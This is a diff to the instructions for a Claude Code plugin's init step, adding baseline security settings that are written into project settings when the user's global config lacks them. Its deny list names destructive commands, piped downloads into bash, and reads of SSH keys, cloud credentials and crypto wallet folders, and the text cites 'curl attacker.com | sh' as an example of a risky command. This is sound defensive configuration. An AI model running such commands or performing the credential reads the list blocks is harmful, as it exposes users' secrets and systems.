@@ -315,13 +315,110 @@ Write project settings so the plugin auto-loads on subsequent launches AND the *
 
 - `$HOME_DIR/.claude/settings.json` ← JSON below, with `<PLUGIN_PATH>` substituted with the absolute value of `${CLAUDE_PLUGIN_ROOT}`.
 
+**Fill hardening gaps the operator's user-global settings don't cover.** Kevin ships a baseline of security + quality defaults (denies, sandbox, effort/model, traffic kill, retention). Most operators won't have these in their user-global `~/.claude/settings.json` — for them, init must write the baseline into project settings so the protection is actually in effect. Operators who *do* already have these globally shouldn't get the same keys duplicated into the project — global already covers them, and re-writing them in project is redundant churn.
+
+**Logic: gap-fill, not mirror.** Before writing the scaffold, `Read` `~/.claude/settings.json` (treat as empty `{}` if absent). For each baseline key below, check whether the operator already has it globally. If global covers it, **omit the key from the project scaffold** — inheritance handles it. If global does not cover it, **write the baseline value into the project scaffold**.
+
+| Project-scaffold key | Baseline value to write when global is missing it | "Already covered" test against global |
+|---|---|---|
+| `cleanupPeriodDays` | `99999` | Any non-empty `cleanupPeriodDays` set globally |
+| `model` | `"opus[1m]"` | Any non-empty `model` set globally |
+| `effortLevel` | `"high"` | Any non-empty `effortLevel` set globally |
+| `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` | `"1"` | Global `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` set to any truthy string |
+| `permissions.deny` | The full deny list below | Global `permissions.deny` is non-empty (any deny suggests the operator is curating their own — don't fight it) |
+| `sandbox` | The full sandbox block below | Global `sandbox.enabled === true` (sandbox is binary — if globally enabled, project doesn't need its own) |
+
+Baseline `permissions.deny` to write when global doesn't already have a deny list:
+
+```json
+[
+  "Bash(rm -rf *)",
+  "Bash(rm -fr *)",
+  "Bash(sudo *)",
+  "Bash(mkfs *)",
+  "Bash(dd *)",
+  "Bash(wget *|bash*)",
+  "Bash(wget *| bash*)",
+  "Bash(git push --force*)",
+  "Bash(git push *--force*)",
+  "Bash(git reset --hard*)",
+  "Edit(~/.bashrc)",
+  "Edit(~/.zshrc)",
+  "Read(~/.ssh/id_*)",
+  "Read(~/.ssh/*.pem)",
+  "Read(~/.ssh/authorized_keys)",
+  "Edit(~/.ssh/id_*)",
+  "Edit(~/.ssh/*.pem)",
+  "Edit(~/.ssh/authorized_keys)",
+  "Read(~/.gnupg/**)",
+  "Read(~/.aws/**)",
+  "Read(~/.azure/**)",
+  "Read(~/.git-credentials)",
+  "Read(~/.docker/config.json)",
+  "Read(~/.kube/**)",
+  "Read(~/.npmrc)",
+  "Read(~/.npm/**)",
+  "Read(~/.pypirc)",
+  "Read(~/.gem/credentials)",
+  "Read(~/Library/Keychains/**)",
+  "Read(~/Library/Application Support/**/metamask*/**)",
+  "Read(~/Library/Application Support/**/electrum*/**)",
+  "Read(~/Library/Application Support/**/exodus*/**)",
+  "Read(~/Library/Application Support/**/phantom*/**)",
+  "Read(~/Library/Application Support/**/solflare*/**)"
+]
+```
+
+Baseline `sandbox` block to write when global `sandbox.enabled !== true`:
+
+```json
+{
+  "enabled": true,
+  "failIfUnavailable": true,
+  "autoAllowBashIfSandboxed": true,
+  "allowUnsandboxedCommands": false,
+  "network": {
+    "allowedDomains": [
+      "github.com",
+      "api.github.com",
+      "raw.githubusercontent.com",
+      "objects.githubusercontent.com",
+      "registry.npmjs.org",
+      "*.npmjs.org",
+      "docs.anthropic.com",
+      "docs.claude.com"
+    ]
+  }
+}
+```
+
+**Do not** touch global keys outside this baseline (`hooks`, `statusLine`, `theme`, `verbose`, other `env.*` entries, other `permissions.allow` entries, `enabledPlugins`) — those are operator-personal, not project-security. Hooks especially: plugin hooks come from `hooks/hooks.json` once registered; mirroring global hooks here would double-fire.
+
+**Critical — never overwrite an existing project `settings.json`.** If `$HOME_DIR/.claude/settings.json` already exists (re-init, or the home was a pre-existing project), `Read` it first and **deep-merge** the scaffold into it. The merged JSON is what gets written back. Rules:
+
+- **Scalars** (`model`, `effortLevel`, `cleanupPeriodDays`, `$schema`, `env.*` string values): existing project value wins. Skip the key when merging — don't replace.
+- **Arrays** (`permissions.allow`, `permissions.deny`, `sandbox.network.allowedDomains`, any `allowWrite`/`denyOnly` arrays): union with the operator's existing entries + dedupe. Don't reorder or remove anything they already had.
+- **Objects** (`permissions`, `sandbox`, `sandbox.network`, `enabledPlugins`, `env`, `hooks`): recurse with the same rules.
+- **`enabledPlugins`**: special case — set `"agent-kevin@agentlayer": true` even if the key already exists with a different value (the operator just ran init, so they want it enabled). Other plugin entries pass through untouched.
+- **`hooks`**: never touch — operator-owned end-to-end. The scaffold doesn't author any hooks block.
+
+Concrete approach: `Read` the existing file (treat as `{}` if absent), build the merged object in-memory per the rules above, then `Write` the full merged JSON back. Do not invoke `jq` or shell tooling for the merge — the orchestrator has the file content already and can deep-merge cleanly without subshell escaping risks.
+
 ```json
 {
   "$schema": "https://json.schemastore.org/claude-code-settings.json",
+  "cleanupPeriodDays": "<99999 if global doesn't set it, else omit>",
+  "model": "<\"opus[1m]\" if global doesn't set it, else omit>",
+  "effortLevel": "<\"high\" if global doesn't set it, else omit>",
+  "env": {
+    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "<\"1\" if global doesn't set it, else omit the whole env block>"
+  },
+  "sandbox": "<full baseline sandbox block above if global.sandbox.enabled !== true, else omit>",
   "enabledPlugins": {
     "agent-kevin@agentlayer": true
   },
   "permissions": {
+    "deny": "<full baseline deny list above if global has no permissions.deny, else omit>",
     "allow": [
       "Bash(cat *)",
       "Bash(date)",
@@ -373,7 +470,7 @@ Write project settings so the plugin auto-loads on subsequent launches AND the *
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
-Do **not** add `sandbox` or `hooks` blocks here. Hooks come from the plugin's own `hooks/hooks.json` once the plugin is registered. API keys + external MCP server config land in `settings.local.json` and `<HOME>/.mcp.json` later via `/agent-kevin:configure-skills` — those files stay separate.
+Do **not** add a `hooks` block here. Hooks come from the plugin's own `hooks/hooks.json` once the plugin is registered. Sandbox lands only via the user-global gap-fill above (never authored fresh in the scaffold when global already enables it). API keys + external MCP server config land in `settings.local.json` and `<HOME>/.mcp.json` later via `/agent-kevin:configure-skills` — those files stay separate.
 
 USER.md template:
 
